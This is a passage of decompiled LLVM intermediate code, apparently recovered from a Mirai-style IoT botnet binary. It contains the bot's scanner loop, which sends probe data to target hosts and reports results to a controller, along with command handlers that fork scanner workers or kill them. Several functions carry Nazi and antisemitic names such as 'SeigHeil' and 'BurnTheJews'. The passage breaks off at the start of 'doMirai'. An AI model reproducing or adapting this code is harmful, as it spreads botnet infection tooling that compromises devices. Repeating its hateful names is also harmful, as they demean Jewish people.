  store i32 %storemerge548, i32* %r2.global-to-local, align 4
  store i32 %v3_16d60, i32* %r3.global-to-local, align 4
  %v4_17b64 = mul i32 %storemerge548, 32
  %v5_17b64 = add i32 %v4_17b64, %v3_16d60
  %v6_17b64 = inttoptr i32 %v5_17b64 to i32*
  %v7_17b64 = load i32, i32* %v6_17b64, align 8
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v5_17b78 = call i32 @send(i32 %v7_17b64, i32 ptrtoint ([5 x i8]* @global_var_38624.675 to i32), i32 4, i32 16384)
  store i32 %storemerge548, i32* %r2.global-to-local, align 4
  store i32 %v3_16d60, i32* %r3.global-to-local, align 4
  %v7_17b84 = load i32, i32* %v6_17b64, align 8
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v5_17b98 = call i32 @send(i32 %v7_17b84, i32 ptrtoint ([8 x i8]* @global_var_3862c.677 to i32), i32 7, i32 16384)
  store i32 %storemerge548, i32* %r2.global-to-local, align 4
  store i32 %v3_16d60, i32* %r3.global-to-local, align 4
  %v7_17ba4 = load i32, i32* %v6_17b64, align 8
  store i32 %v7_17ba4, i32* @r4, align 4
  %v2_17bac = load i32, i32* bitcast ([116 x i8*]* @global_var_44ae8.794 to i32*), align 16
  store i32 %v2_17bac, i32* @r5, align 4
  store i32 %v2_17bac, i32* %r3.global-to-local, align 4
  %v1_17bb8 = inttoptr i32 %v2_17bac to i8*
  %v3_17bbc = call i32 @strlen(i8* %v1_17bb8)
  %v0_17bc4 = load i32, i32* @r4, align 4
  %v0_17bc8 = load i32, i32* @r5, align 4
  store i32 %v3_17bbc, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_17bd4 = call i32 @send(i32 %v0_17bc4, i32 %v0_17bc8, i32 %v3_17bbc, i32 16384)
  store i32 %v4_17bd4, i32* %r3.global-to-local, align 4
  %v1_17bdc = icmp slt i32 %v4_17bd4, 0
  br i1 %v1_17bdc, label %dec_label_pc_17be4, label %dec_label_pc_17c90

dec_label_pc_17be4:                               ; preds = %dec_label_pc_17b30
  %v2_17be8 = load i32, i32* @global_var_53710.671, align 4
  store i32 %v2_17be8, i32* @r4, align 4
  store i32 %v3_16d60, i32* %r2.global-to-local, align 4
  store i32 %v2_16e3c, i32* %r3.global-to-local, align 4
  %v3_17c00 = call i32 @get_ipstate_host(i32 %v2_16e3c, i32 %v0_17bc8, i32 %v3_16d60)
  store i32 %v3_17c00, i32* %ip.global-to-local, align 4
  store i32 %v3_16d60, i32* %r2.global-to-local, align 4
  %v2_17c1c = add i32 %v2_16e3c, 8
  store i32 %v2_17c1c, i32* %r3.global-to-local, align 4
  %v1_17c20 = add i32 %v2_16e3c, 10
  %v2_17c20 = inttoptr i32 %v1_17c20 to i8*
  %v3_17c20 = load i8, i8* %v2_17c20, align 2
  %v4_17c20 = zext i8 %v3_17c20 to i32
  store i32 %v4_17c20, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([128 x i8*]* @global_var_4509c.801 to i32), i32* %r3.global-to-local, align 4
  %v4_17c2c = mul nuw nsw i32 %v4_17c20, 4
  %v5_17c2c = add i32 %v4_17c2c, ptrtoint ([128 x i8*]* @global_var_4509c.801 to i32)
  %v6_17c2c = inttoptr i32 %v5_17c2c to i32*
  %v7_17c2c = load i32, i32* %v6_17c2c, align 4
  store i32 %v3_16d60, i32* %r2.global-to-local, align 4
  store i32 %v2_17c1c, i32* %r3.global-to-local, align 4
  %v1_17c48 = add i32 %v2_16e3c, 11
  %v2_17c48 = inttoptr i32 %v1_17c48 to i8*
  %v3_17c48 = load i8, i8* %v2_17c48, align 1
  %v4_17c48 = zext i8 %v3_17c48 to i32
  store i32 %v4_17c48, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([66 x i8*]* @global_var_45194.804 to i32), i32* %r3.global-to-local, align 4
  %v4_17c54 = mul nuw nsw i32 %v4_17c48, 4
  %v5_17c54 = add i32 %v4_17c54, ptrtoint ([66 x i8*]* @global_var_45194.804 to i32)
  %v6_17c54 = inttoptr i32 %v5_17c54 to i32*
  %v7_17c54 = load i32, i32* %v6_17c54, align 4
  store i32 %v7_17c54, i32* %r3.global-to-local, align 4
  %v1_17c58 = load i32, i32* @sp, align 4
  %v2_17c58 = inttoptr i32 %v1_17c58 to i32*
  store i32 %v7_17c2c, i32* %v2_17c58, align 4
  %v0_17c5c = load i32, i32* %r3.global-to-local, align 4
  %v1_17c5c = load i32, i32* @sp, align 4
  %v2_17c5c = add i32 %v1_17c5c, 4
  %v3_17c5c = inttoptr i32 %v2_17c5c to i32*
  store i32 %v0_17c5c, i32* %v3_17c5c, align 4
  %v0_17c68 = load i32, i32* @r4, align 4
  store i32 %v0_17c68, i32* @r2, align 4
  %v0_17c6c = load i32, i32* %ip.global-to-local, align 4
  store i32 %v0_17c6c, i32* %r3.global-to-local, align 4
  %v3_17c70 = call i32 @Send(i32 %arg3, i32 ptrtoint ([52 x i8]* @global_var_386dc.813 to i32))
  store i32 %v3_16d60, i32* %r2.global-to-local, align 4
  store i32 %v2_16e3c, i32* %r3.global-to-local, align 4
  %v1_17c88 = call i32 @reset_ipstate(i32 %v2_16e3c)
  br label %dec_label_pc_17d6c

dec_label_pc_17c90:                               ; preds = %dec_label_pc_17b30
  store i32 %v3_16d60, i32* %r2.global-to-local, align 4
  %v2_17ca4 = add i32 %v3_16e38, %v2_1741c
  store i32 %v2_17ca4, i32* %r3.global-to-local, align 4
  %v1_17ca8 = inttoptr i32 %v2_17ca4 to i32*
  %v2_17ca8 = load i32, i32* %v1_17ca8, align 8
  store i32 %v2_17ca8, i32* %r3.global-to-local, align 4
  %v1_17cac = add i32 %v2_17ca8, 10
  store i32 %v1_17cac, i32* @r4, align 4
  %v2_17cb4 = call i32 @__GI_time(i32* null)
  store i32 %v2_17cb4, i32* %r3.global-to-local, align 4
  %v0_17cbc = load i32, i32* @r4, align 4
  %v3_17cbc = icmp ult i32 %v0_17cbc, %v2_17cb4
  br i1 %v3_17cbc, label %dec_label_pc_17cc4, label %dec_label_pc_17d6c

dec_label_pc_17cc4:                               ; preds = %dec_label_pc_17c90
  %v2_17cc8 = load i32, i32* @global_var_53710.671, align 4
  store i32 %v2_17cc8, i32* @r4, align 4
  store i32 %v3_16d60, i32* %r2.global-to-local, align 4
  store i32 %v2_16e3c, i32* %r3.global-to-local, align 4
  %v3_17ce0 = call i32 @get_ipstate_host(i32 %v2_16e3c, i32 16, i32 %v3_16d60)
  store i32 %v3_17ce0, i32* %ip.global-to-local, align 4
  store i32 %v3_16d60, i32* %r2.global-to-local, align 4
  %v2_17cfc = add i32 %v2_16e3c, 8
  store i32 %v2_17cfc, i32* %r3.global-to-local, align 4
  %v1_17d00 = add i32 %v2_16e3c, 10
  %v2_17d00 = inttoptr i32 %v1_17d00 to i8*
  %v3_17d00 = load i8, i8* %v2_17d00, align 2
  %v4_17d00 = zext i8 %v3_17d00 to i32
  store i32 %v4_17d00, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([128 x i8*]* @global_var_4509c.801 to i32), i32* %r3.global-to-local, align 4
  %v4_17d0c = mul nuw nsw i32 %v4_17d00, 4
  %v5_17d0c = add i32 %v4_17d0c, ptrtoint ([128 x i8*]* @global_var_4509c.801 to i32)
  %v6_17d0c = inttoptr i32 %v5_17d0c to i32*
  %v7_17d0c = load i32, i32* %v6_17d0c, align 4
  store i32 %v3_16d60, i32* %r2.global-to-local, align 4
  store i32 %v2_17cfc, i32* %r3.global-to-local, align 4
  %v1_17d28 = add i32 %v2_16e3c, 11
  %v2_17d28 = inttoptr i32 %v1_17d28 to i8*
  %v3_17d28 = load i8, i8* %v2_17d28, align 1
  %v4_17d28 = zext i8 %v3_17d28 to i32
  store i32 %v4_17d28, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([66 x i8*]* @global_var_45194.804 to i32), i32* %r3.global-to-local, align 4
  %v4_17d34 = mul nuw nsw i32 %v4_17d28, 4
  %v5_17d34 = add i32 %v4_17d34, ptrtoint ([66 x i8*]* @global_var_45194.804 to i32)
  %v6_17d34 = inttoptr i32 %v5_17d34 to i32*
  %v7_17d34 = load i32, i32* %v6_17d34, align 4
  store i32 %v7_17d34, i32* %r3.global-to-local, align 4
  %v1_17d38 = load i32, i32* @sp, align 4
  %v2_17d38 = inttoptr i32 %v1_17d38 to i32*
  store i32 %v7_17d0c, i32* %v2_17d38, align 4
  %v0_17d3c = load i32, i32* %r3.global-to-local, align 4
  %v1_17d3c = load i32, i32* @sp, align 4
  %v2_17d3c = add i32 %v1_17d3c, 4
  %v3_17d3c = inttoptr i32 %v2_17d3c to i32*
  store i32 %v0_17d3c, i32* %v3_17d3c, align 4
  %v0_17d48 = load i32, i32* @r4, align 4
  store i32 %v0_17d48, i32* @r2, align 4
  %v0_17d4c = load i32, i32* %ip.global-to-local, align 4
  store i32 %v0_17d4c, i32* %r3.global-to-local, align 4
  %v3_17d50 = call i32 @Send(i32 %arg3, i32 ptrtoint ([60 x i8]* @global_var_38710.815 to i32))
  store i32 %v3_16d60, i32* %r2.global-to-local, align 4
  store i32 %v2_16e3c, i32* %r3.global-to-local, align 4
  %v1_17d68 = call i32 @reset_ipstate(i32 %v2_16e3c)
  br label %dec_label_pc_17d6c

dec_label_pc_17d6c:                               ; preds = %dec_label_pc_1740c, %dec_label_pc_17540, %dec_label_pc_17780, %dec_label_pc_17ae0, %dec_label_pc_17c90, %dec_label_pc_16e7c, %dec_label_pc_1709c, %dec_label_pc_17be4, %dec_label_pc_17b14, %dec_label_pc_17ac4, %dec_label_pc_17a14, %dec_label_pc_179f4, %dec_label_pc_17980, %dec_label_pc_178bc, %dec_label_pc_178a0, %dec_label_pc_17858, %dec_label_pc_177b4, %dec_label_pc_17760, %dec_label_pc_17740, %dec_label_pc_1767c, %dec_label_pc_17660, %dec_label_pc_17618, %dec_label_pc_17574, %dec_label_pc_17520, %dec_label_pc_17500, %dec_label_pc_17440, %dec_label_pc_173f0, %dec_label_pc_17384, %dec_label_pc_17368, %dec_label_pc_171d8, %dec_label_pc_171bc, %dec_label_pc_17078, %dec_label_pc_17cc4
  %v1_17d70 = add nuw nsw i32 %storemerge548, 1
  store i32 %v1_17d70, i32* %r2.global-to-local, align 4
  store i32 %stack_var_-64.0, i32* %r3.global-to-local, align 4
  %v5_17d84 = icmp slt i32 %v1_17d70, %stack_var_-64.0
  br i1 %v5_17d84, label %dec_label_pc_16e2c, label %dec_label_pc_16e20

; uselistorder directives
  uselistorder i32 %v1_17d70, { 2, 1, 0 }
  uselistorder i32 %v3_17bbc, { 1, 0 }
  uselistorder i32 %v3_17830, { 1, 0 }
  uselistorder i32 %v3_175f0, { 1, 0 }
  uselistorder i32 %v5_172dc, { 1, 0, 2, 3 }
  uselistorder i32 %storemerge610, { 1, 0 }
  uselistorder i32 %v2_170fc, { 1, 0 }
  uselistorder i32 %v1_16fec, { 1, 0 }
  uselistorder i8* %v2_16fe8, { 1, 0, 2 }
  uselistorder i32 %v1_16fac, { 1, 0 }
  uselistorder i8* %v2_16fa8, { 1, 0, 2 }
  uselistorder i32 %v2_16f60, { 1, 0 }
  uselistorder i32 %v2_16f00, { 2, 1, 0 }
  uselistorder i8 %v2_16e94, { 1, 0 }
  uselistorder i32 %v2_16e3c, { 69, 68, 70, 72, 71, 74, 73, 62, 61, 63, 65, 64, 67, 66, 46, 45, 48, 47, 52, 51, 53, 54, 56, 55, 50, 49, 58, 57, 60, 59, 42, 41, 40, 39, 38, 44, 43, 34, 33, 36, 37, 35, 30, 29, 28, 27, 26, 32, 31, 22, 21, 24, 25, 23, 20, 19, 18, 17, 14, 13, 16, 15, 2, 1, 4, 3, 5, 9, 10, 6, 8, 7, 12, 11, 0 }
  uselistorder i32 %v3_16e38, { 10, 9, 8, 7, 6, 5, 4, 3, 1, 0, 2 }
  uselistorder i32 %storemerge548, { 1, 7, 6, 4, 5, 3, 10, 8, 9, 13, 11, 12, 16, 14, 15, 19, 17, 18, 22, 20, 21, 30, 29, 28, 27, 26, 25, 23, 24, 38, 37, 36, 34, 35, 33, 32, 31, 2, 0 }
  uselistorder i32 %v2_1741c, { 6, 0, 7, 1, 8, 2, 9, 3, 10, 4, 5 }
  uselistorder i32 %v2_1733c, { 1, 0, 2 }
  uselistorder i32 %v2_171f8, { 3, 2, 4, 0, 1 }
  uselistorder i32 %v1_16e08, { 2, 1, 0 }
  uselistorder i32 %storemerge457, { 1, 0 }
  uselistorder i32 %v2_16d84, { 1, 0 }
  uselistorder i32 %v3_16d60, { 29, 28, 27, 25, 26, 24, 23, 22, 21, 19, 20, 18, 17, 0, 16, 33, 32, 42, 41, 40, 38, 39, 37, 36, 35, 34, 31, 1, 30, 48, 47, 46, 45, 44, 2, 43, 52, 51, 54, 53, 50, 3, 49, 60, 59, 58, 57, 56, 4, 55, 64, 63, 66, 65, 62, 5, 61, 76, 75, 73, 72, 71, 74, 70, 69, 68, 6, 67, 85, 86, 84, 83, 82, 7, 81, 8, 80, 90, 89, 88, 87, 9, 79, 10, 78, 77, 15, 14, 11, 13, 92, 93, 91, 12, 94 }
  uselistorder i32 %stack_var_-64.0, { 6, 5, 3, 8, 7, 1, 2, 4, 0 }
  uselistorder i32* %stack_var_-24, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-612, { 0, 2, 1 }
  uselistorder i32* %stack_var_-340, { 1, 0, 2, 3 }
  uselistorder i32* %r3.global-to-local, { 160, 0, 1, 3, 4, 5, 6, 7, 8, 9, 12, 10, 11, 13, 14, 15, 16, 17, 18, 19, 20, 21, 23, 22, 24, 25, 26, 27, 28, 29, 30, 33, 31, 32, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 49, 47, 48, 50, 53, 51, 52, 57, 54, 55, 56, 58, 59, 60, 61, 63, 62, 64, 65, 66, 67, 68, 69, 70, 73, 71, 72, 74, 75, 76, 80, 77, 78, 79, 81, 82, 83, 84, 86, 85, 87, 88, 89, 90, 91, 92, 93, 96, 94, 95, 97, 98, 99, 103, 100, 101, 102, 104, 107, 105, 106, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 2, 124, 125, 126, 127, 130, 128, 129, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 167, 162, 161, 168, 163, 164, 165, 166 }
  uselistorder i32* %r2.global-to-local, { 114, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 23, 24, 25, 26, 27, 28, 29, 22, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 44, 40, 41, 42, 43, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 60, 57, 58, 59, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 80, 77, 78, 79, 84, 81, 82, 83, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 118, 115, 119, 116, 117, 0 }
  uselistorder i32 (i32, i32, i32)* @get_ipstate_host, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32)* @contains_success, { 2, 1, 0 }
  uselistorder i32 ptrtoint ([66 x i8*]* @global_var_45194.804 to i32), { 3, 5, 4, 6, 2, 7, 0, 8, 1, 9 }
  uselistorder i32 ptrtoint ([3 x i8]* @global_var_385ec.665 to i32), { 1, 0, 3, 2 }
  uselistorder i32 (i32, i32, i32, i32)* @send, { 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 0, 1 }
  uselistorder i32 ptrtoint ([128 x i8*]* @global_var_4509c.801 to i32), { 3, 5, 4, 6, 2, 7, 0, 8, 1, 9 }
  uselistorder i32 (i32)* @contains_fail, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_452a0 to i32), { 1, 0, 2, 3 }
  uselistorder i32 (i32)* @reset_ipstate, { 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @fcntl, { 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %arg3, { 1, 2, 0, 3 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_17d6c, { 32, 4, 7, 8, 3, 9, 10, 11, 12, 13, 14, 15, 16, 2, 17, 18, 19, 20, 21, 22, 1, 23, 24, 25, 0, 26, 27, 28, 29, 30, 6, 31, 5 }
  uselistorder label %dec_label_pc_1720c, { 1, 0 }
  uselistorder label %dec_label_pc_171d8, { 1, 0 }
  uselistorder label %dec_label_pc_17054, { 1, 0 }
  uselistorder label %dec_label_pc_16e7c, { 1, 0 }
  uselistorder label %dec_label_pc_16e2c, { 1, 0 }
  uselistorder label %dec_label_pc_16e20, { 1, 0, 2 }
  uselistorder label %dec_label_pc_16da4, { 1, 0 }
  uselistorder label %dec_label_pc_16cc0, { 1, 0 }
}

define i32 @SeigHeil(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v3_17dc0 = load i32, i32* @fp, align 4
  store i32 97736, i32* %stack_var_-4, align 4
  %v2_17dc4 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_17dc4, i32* @fp, align 4
  %v0_17dd0 = call i32 @fork()
  %v1_17de0 = call i32 @sysconf(i32 84)
  %v3_17df0 = mul i32 %v1_17de0, 64
  %v2_17e08 = icmp eq i32 %v0_17dd0, 0
  br i1 %v2_17e08, label %dec_label_pc_17e54.preheader, label %dec_label_pc_17e10

dec_label_pc_17e10:                               ; preds = %entry
  store i32 %v0_17dd0, i32* @global_var_49b34.817, align 4
  br label %dec_label_pc_17e64

dec_label_pc_17e54.preheader:                     ; preds = %entry
  %v5_17e6021 = icmp sgt i32 %v1_17de0, 0
  br i1 %v5_17e6021, label %dec_label_pc_17e38, label %dec_label_pc_17e64

dec_label_pc_17e38:                               ; preds = %dec_label_pc_17e54.preheader, %dec_label_pc_17e38
  %storemerge122 = phi i32 [ %v1_17e4c, %dec_label_pc_17e38 ], [ 0, %dec_label_pc_17e54.preheader ]
  %v4_17e44 = call i32 @BurnTheJews(i32 370, i32 %v3_17df0, i32 %arg1, i32 %v1_17de0)
  %v1_17e4c = add nuw nsw i32 %storemerge122, 1
  %v5_17e60 = icmp slt i32 %v1_17e4c, %v1_17de0
  br i1 %v5_17e60, label %dec_label_pc_17e38, label %dec_label_pc_17e64

dec_label_pc_17e64:                               ; preds = %dec_label_pc_17e54.preheader, %dec_label_pc_17e38, %dec_label_pc_17e10
  %v1_17e6c = phi i32 [ %v1_17de0, %dec_label_pc_17e10 ], [ %v1_17de0, %dec_label_pc_17e54.preheader ], [ %v4_17e44, %dec_label_pc_17e38 ]
  store i32 %v3_17dc0, i32* @fp, align 4
  ret i32 %v1_17e6c

; uselistorder directives
  uselistorder i32 %v1_17e4c, { 1, 0 }
  uselistorder i32 %v1_17de0, { 1, 3, 5, 4, 2, 0 }
  uselistorder i32 %v0_17dd0, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder label %dec_label_pc_17e64, { 1, 0, 2 }
  uselistorder label %dec_label_pc_17e38, { 1, 0 }
}

define i32 @HeilHitler(i32 %arg1) local_unnamed_addr {
entry:
  ret i32 %arg1
}

define i32 @SeigHeil.11064(i32 %arg1) local_unnamed_addr {
entry:
  %v0_17ea8 = call i32 @fork()
  %v1_17eb8 = call i32 @sysconf(i32 84)
  %v2_17ed8 = mul i32 %v1_17eb8, 100
  %v2_17ef0 = icmp eq i32 %v0_17ea8, 0
  br i1 %v2_17ef0, label %dec_label_pc_17f3c.preheader, label %dec_label_pc_17ef8

dec_label_pc_17ef8:                               ; preds = %entry
  store i32 %v0_17ea8, i32* @global_var_49b34.817, align 4
  br label %dec_label_pc_17f4c

dec_label_pc_17f3c.preheader:                     ; preds = %entry
  %v5_17f4821 = icmp sgt i32 %v1_17eb8, 0
  br i1 %v5_17f4821, label %dec_label_pc_17f20, label %dec_label_pc_17f4c

dec_label_pc_17f20:                               ; preds = %dec_label_pc_17f3c.preheader, %dec_label_pc_17f20
  %storemerge122 = phi i32 [ %v1_17f34, %dec_label_pc_17f20 ], [ 0, %dec_label_pc_17f3c.preheader ]
  %v4_17f2c = call i32 @MiraiScanner(i32 370, i32 %v2_17ed8, i32 %arg1, i32 %v1_17eb8)
  %v1_17f34 = add nuw nsw i32 %storemerge122, 1
  %v5_17f48 = icmp slt i32 %v1_17f34, %v1_17eb8
  br i1 %v5_17f48, label %dec_label_pc_17f20, label %dec_label_pc_17f4c

dec_label_pc_17f4c:                               ; preds = %dec_label_pc_17f3c.preheader, %dec_label_pc_17f20, %dec_label_pc_17ef8
  %v1_17f54 = phi i32 [ %v1_17eb8, %dec_label_pc_17ef8 ], [ %v1_17eb8, %dec_label_pc_17f3c.preheader ], [ %v4_17f2c, %dec_label_pc_17f20 ]
  ret i32 %v1_17f54

; uselistorder directives
  uselistorder i32 %v1_17f34, { 1, 0 }
  uselistorder i32 %v1_17eb8, { 0, 2, 4, 3, 1, 5 }
  uselistorder i32 %v0_17ea8, { 1, 0 }
  uselistorder label %dec_label_pc_17f4c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_17f20, { 1, 0 }
}

define i32 @doScanner(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  store i32 98152, i32* %stack_var_-4, align 4
  %v2_17f64 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_17f64, i32* @fp, align 4
  store i32 %arg4, i32* %stack_var_-32, align 4
  %v5_17f84 = icmp sgt i32 %arg3, 0
  br i1 %v5_17f84, label %dec_label_pc_17f9c, label %dec_label_pc_17f88

dec_label_pc_17f88:                               ; preds = %entry
  store i32 %arg2, i32* @r2, align 4
  %v3_17f94 = call i32 @Send(i32 %arg1, i32 ptrtoint ([29 x i8]* @global_var_3874c.820 to i32))
  br label %dec_label_pc_18148

dec_label_pc_17f9c:                               ; preds = %entry
  %v1_17fa0 = add i32 %arg4, 4
  %v1_17fa4 = inttoptr i32 %v1_17fa0 to i32*
  %v2_17fa4 = load i32, i32* %v1_17fa4, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_3876c.822 to i32), i32* @r1, align 4
  %v3_17fb0 = inttoptr i32 %v2_17fa4 to i8*
  %v4_17fb0 = call i32 @__GI_strcoll(i8* %v3_17fb0, i32 ptrtoint ([3 x i8]* @global_var_3876c.822 to i32))
  %v2_17fb8 = icmp eq i32 %v4_17fb0, 0
  br i1 %v2_17fb8, label %dec_label_pc_17fe4, label %dec_label_pc_17fc0

dec_label_pc_17fc0:                               ; preds = %dec_label_pc_17f9c
  %v3_17fc0 = load i32, i32* %stack_var_-32, align 4
  %v1_17fc4 = add i32 %v3_17fc0, 4
  %v1_17fc8 = inttoptr i32 %v1_17fc4 to i32*
  %v2_17fc8 = load i32, i32* %v1_17fc8, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_38770.824 to i32), i32* @r1, align 4
  %v3_17fd4 = inttoptr i32 %v2_17fc8 to i8*
  %v4_17fd4 = call i32 @__GI_strcoll(i8* %v3_17fd4, i32 ptrtoint ([3 x i8]* @global_var_38770.824 to i32))
  %v2_17fdc = icmp eq i32 %v4_17fd4, 0
  br i1 %v2_17fdc, label %dec_label_pc_17fe4, label %dec_label_pc_18060

dec_label_pc_17fe4:                               ; preds = %dec_label_pc_17fc0, %dec_label_pc_17f9c
  %v2_17fe8 = load i32, i32* @global_var_49b34.817, align 4
  %v2_17fec = icmp eq i32 %v2_17fe8, 0
  br i1 %v2_17fec, label %dec_label_pc_17ff4, label %dec_label_pc_18044

dec_label_pc_17ff4:                               ; preds = %dec_label_pc_17fe4
  %v1_17ff8 = call i32 @SeigHeil(i32 %arg1)
  %v2_18000 = load i32, i32* @global_var_49b34.817, align 4
  %v2_18004 = icmp eq i32 %v2_18000, 0
  %v2_1802c = load i32, i32* @global_var_53710.671, align 4
  br i1 %v2_18004, label %dec_label_pc_18028, label %dec_label_pc_1800c

dec_label_pc_1800c:                               ; preds = %dec_label_pc_17ff4
  store i32 %v2_1802c, i32* @r2, align 4
  %v3_18020 = call i32 @Send(i32 %arg1, i32 ptrtoint ([43 x i8]* @global_var_38774.828 to i32))
  br label %dec_label_pc_18148

dec_label_pc_18028:                               ; preds = %dec_label_pc_17ff4
  store i32 %v2_1802c, i32* @r2, align 4
  %v3_1803c = call i32 @Send(i32 %arg1, i32 ptrtoint ([51 x i8]* @global_var_387a0.830 to i32))
  br label %dec_label_pc_18148

dec_label_pc_18044:                               ; preds = %dec_label_pc_17fe4
  %v2_18048 = load i32, i32* @global_var_53710.671, align 4
  store i32 %v2_18048, i32* @r2, align 4
  %v3_18058 = call i32 @Send(i32 %arg1, i32 ptrtoint ([51 x i8]* @global_var_387d4.832 to i32))
  br label %dec_label_pc_18148

dec_label_pc_18060:                               ; preds = %dec_label_pc_17fc0
  %v3_18060 = load i32, i32* %stack_var_-32, align 4
  %v1_18064 = add i32 %v3_18060, 4
  %v1_18068 = inttoptr i32 %v1_18064 to i32*
  %v2_18068 = load i32, i32* %v1_18068, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_38808.834 to i32), i32* @r1, align 4
  %v3_18074 = inttoptr i32 %v2_18068 to i8*
  %v4_18074 = call i32 @__GI_strcoll(i8* %v3_18074, i32 ptrtoint ([4 x i8]* @global_var_38808.834 to i32))
  %v2_1807c = icmp eq i32 %v4_18074, 0
  br i1 %v2_1807c, label %dec_label_pc_180a8, label %dec_label_pc_18084

dec_label_pc_18084:                               ; preds = %dec_label_pc_18060
  %v3_18084 = load i32, i32* %stack_var_-32, align 4
  %v1_18088 = add i32 %v3_18084, 4
  %v1_1808c = inttoptr i32 %v1_18088 to i32*
  %v2_1808c = load i32, i32* %v1_1808c, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_3880c.836 to i32), i32* @r1, align 4
  %v3_18098 = inttoptr i32 %v2_1808c to i8*
  %v4_18098 = call i32 @__GI_strcoll(i8* %v3_18098, i32 ptrtoint ([4 x i8]* @global_var_3880c.836 to i32))
  %v2_180a0 = icmp eq i32 %v4_18098, 0
  br i1 %v2_180a0, label %dec_label_pc_180a8, label %dec_label_pc_18138

dec_label_pc_180a8:                               ; preds = %dec_label_pc_18084, %dec_label_pc_18060
  %v2_180ac = load i32, i32* @global_var_49b34.817, align 4
  %v2_180b0 = icmp eq i32 %v2_180ac, 0
  br i1 %v2_180b0, label %dec_label_pc_1811c, label %dec_label_pc_180b8

dec_label_pc_180b8:                               ; preds = %dec_label_pc_180a8
  %v2_180c8 = call i32 @kill(i32 %v2_180ac, i32 9)
  %v2_180d0 = icmp eq i32 %v2_180c8, 0
  %v2_180dc = load i32, i32* @global_var_53710.671, align 4
  br i1 %v2_180d0, label %dec_label_pc_180d8, label %dec_label_pc_18100

dec_label_pc_180d8:                               ; preds = %dec_label_pc_180b8
  store i32 %v2_180dc, i32* @r2, align 4
  %v3_180ec = call i32 @Send(i32 %arg1, i32 ptrtoint ([42 x i8]* @global_var_38810.838 to i32))
  store i32 0, i32* @global_var_49b34.817, align 4
  br label %dec_label_pc_18148

dec_label_pc_18100:                               ; preds = %dec_label_pc_180b8
  store i32 %v2_180dc, i32* @r2, align 4
  %v3_18114 = call i32 @Send(i32 %arg1, i32 ptrtoint ([50 x i8]* @global_var_3883c.840 to i32))
  br label %dec_label_pc_18148

dec_label_pc_1811c:                               ; preds = %dec_label_pc_180a8
  %v2_18120 = load i32, i32* @global_var_53710.671, align 4
  store i32 %v2_18120, i32* @r2, align 4
  %v3_18130 = call i32 @Send(i32 %arg1, i32 ptrtoint ([47 x i8]* @global_var_38870.842 to i32))
  br label %dec_label_pc_18148

dec_label_pc_18138:                               ; preds = %dec_label_pc_18084
  store i32 %arg2, i32* @r2, align 4
  %v3_18144 = call i32 @Send(i32 %arg1, i32 ptrtoint ([29 x i8]* @global_var_3874c.820 to i32))
  br label %dec_label_pc_18148

dec_label_pc_18148:                               ; preds = %dec_label_pc_1811c, %dec_label_pc_18100, %dec_label_pc_180d8, %dec_label_pc_18044, %dec_label_pc_18028, %dec_label_pc_1800c, %dec_label_pc_17f88, %dec_label_pc_18138
  %v1_18150 = phi i32 [ %v3_18130, %dec_label_pc_1811c ], [ %v3_18114, %dec_label_pc_18100 ], [ %v3_180ec, %dec_label_pc_180d8 ], [ %v3_18058, %dec_label_pc_18044 ], [ %v3_1803c, %dec_label_pc_18028 ], [ %v3_18020, %dec_label_pc_1800c ], [ %v3_17f94, %dec_label_pc_17f88 ], [ %v3_18144, %dec_label_pc_18138 ]
  ret i32 %v1_18150

; uselistorder directives
  uselistorder i32 %v2_1802c, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder i32 %arg1, { 1, 4, 3, 2, 5, 6, 7, 8, 0 }
  uselistorder label %dec_label_pc_18148, { 7, 0, 1, 2, 3, 4, 5, 6 }
}

define i32 @doMirai(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
